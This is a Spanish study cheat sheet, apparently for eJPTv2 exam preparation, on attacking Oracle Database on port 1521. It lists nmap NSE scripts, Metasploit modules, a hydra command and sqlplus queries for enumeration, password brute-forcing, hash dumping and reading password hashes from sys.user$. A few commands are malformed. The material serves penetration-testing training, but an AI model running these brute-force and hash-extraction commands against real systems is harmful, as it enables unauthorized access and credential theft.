---
layout: default
title: Preparación EJPTv2
---


# 🔍 Puerto 1521 - Oracle Database

Oracle Database El puerto 1521 es utilizado por el servicio Oracle Database, una de las bases de datos más utilizadas en entornos empresariales y críticos. Debido a su importancia, es un objetivo frecuente en auditorías de seguridad.

## 🛠️ Herramientas Principales:

Nmap + Scripts NSE: Enumeración y detección de vulnerabilidades. 🛠️ Metasploit: Explotación de fallos y acceso no autorizado. 🛠️ Hydra & Medusa: Ataques de fuerza bruta para credenciales.

## 📝 Reconocimiento e Identificación del Servicio Oracle

```bash
nmap -p 1521 -sCV <ip_victima> # Escaneo para intentar ver la versión. 
nmap -p 1521 --script oracle-enum-users <ip_victima> # Enumeración de usuarios. 
nmap -p 1521 --script oracle-brute <ip_victima> # Ataque de fuerza bruta. 
nmap -p 1521 --script oracle-sid-brute <ip_victima> # Descubrimiento del SID de la base de datos.
nmap -p 1521 --script oracle-tns-version <ip_victima> # Ver versión del servicio TNS.
```

## Uso de Metasploit para Auditoría de Oracle🛠️

```bash
msfconsole -q 
use auxiliary/admin/oracle/oracle_login # Enumeración de usuarios 
set RHOSTS <ip_victima> 
run
```

## Ataque de autenticación débil.

```bash
use auxiliary/scanner/oracle/oracle_login 
set RHOSTS <ip_victima> 
set USERNAME SYS
set PASSWORD password 
run
```

## Lista recursos de Oracle Database.

```bash
use auxiliary/admin/oracle/oracle_sid_brute # Descubrimiento de SID 
use auxiliary/admin/oracle/oracle_hashdump # Extracción de hashes de contraseñas 
use auxiliary/admin/oracle/oracle_sql # Ejecución de consultas SQL 
use auxiliary/admin/oracle/oracle_schema # Enumeración del esquema de la base de datos
```

## 🔑 Fuerza brutal al servicio Oracle Database

```bash
hydra -l -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <ip_victima> oracle
```

Metasploit

```bash
msfconsole -q use auxiliary/scanner/oracle/oracle_login # Ataque de Fuerza Bruta contra Oracle Database 
set RHOSTS <ip_victima> 
set USER_FILE /ruta_diccionario.txt 
set PASS_FILE /ruta_diccionario.txt 
set THREADS <número> # Definir número de intentos por segundo (Opcional, por defecto 5) exploit
```

## 📊 Comandos para interactuar con Oracle Database

```bash
sqlplus /<contraseña>@<ip_servidor>:1521/ # Iniciar sesión con credenciales válidas. 
sqlplus / as sysdba # Iniciar sesión como administrador. 
SELECT username FROM dba_users; # Enumerar usuarios de la base de datos. 
SELECT * FROM all_tables; # Mostrar todas las tablas en la base de datos. 
SELECT * FROM all_views; # Enumerar todas las vistas disponibles. 
SELECT * FROM all_indexes; # Enumerar todos los índices de la base de datos. 
SELECT password FROM sys.user$ WHERE name='' # Obtener hashes de contraseñas de los usuarios.
```

---